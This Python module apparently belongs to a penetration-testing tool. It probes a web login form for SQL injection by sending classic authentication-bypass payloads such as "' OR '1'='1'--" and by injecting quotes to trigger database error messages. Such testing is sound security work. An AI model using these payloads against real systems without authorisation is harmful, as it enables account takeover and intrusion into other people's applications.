from modules.auth import attempt_login
from modules.http_client import HttpClient


class SQLInjection:
    def __init__(self, target):
        self.target = target

    def try_login(self, payload):
        client = HttpClient(self.target)
        success, _ = attempt_login(client, payload, "anything")
        return success


    def check_error_based(self):
        print("\n--- Error-based SQL Injection Testing ---")

        sql_errors = [
            "sqlexception",
            "syntax error",
            "unclosed quotation",
            "ora-",
            "you have an error in your sql syntax",
            "odbc",
            "sql server",
        ]

        fields = ["uid", "passw"]
        vulnerable_fields = []

        for field in fields:
            client = HttpClient(self.target)
            data = {"uid": "test", "passw": "test", "btnSubmit": "Login"}
            data[field] = "'"
            response = client.post("/doLogin", data=data)
            body = response.text.lower()

            if any(error in body for error in sql_errors):
                print(f"    [VULNERABLE] SQL error triggered in field: {field}")
                vulnerable_fields.append(field)
            else:
                print(f"    [SAFE]       No SQL error in field: {field}")

        return vulnerable_fields

    def run(self):
        print("\n--- SQL Injection Testing ---")

        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "' OR 1=1--",
        ]

        vulnerable_payloads = []

        for payload in payloads:
            success = self.try_login(payload)

            if success:
                print(f"    [VULNERABLE] Login bypassed with: {payload}")
                vulnerable_payloads.append(payload)
            else:
                print(f"    [SAFE]       Did not work: {payload}")

        print(f"\n[SUMMARY] {len(vulnerable_payloads)}/{len(payloads)} payloads bypassed login")
        if vulnerable_payloads:
            print("    SQL injection vulnerability confirmed on login form!")
        self.check_error_based()
        print("\n--- SQL Injection Testing Complete ---")